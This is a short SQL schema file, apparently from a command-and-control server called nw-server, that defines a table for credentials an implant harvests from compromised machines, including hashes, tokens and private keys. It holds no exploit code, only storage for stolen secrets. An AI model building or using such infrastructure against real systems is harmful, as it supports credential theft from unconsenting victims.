-- Harvested credential storage for nw-server.
-- One row per credential the implant collects; `secret` holds the recovered
-- material (hash, token, private key, saved field). Admin-gated reads live in
-- the dispatch layer, not here.

CREATE TABLE IF NOT EXISTS c2_creds (
    id TEXT PRIMARY KEY,
    session_id TEXT NOT NULL,
    source TEXT NOT NULL,
    cred_type TEXT NOT NULL,
    identifier TEXT NOT NULL,
    secret TEXT NOT NULL,
    created_at TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now'))
);

CREATE INDEX IF NOT EXISTS idx_c2_creds_session ON c2_creds(session_id);
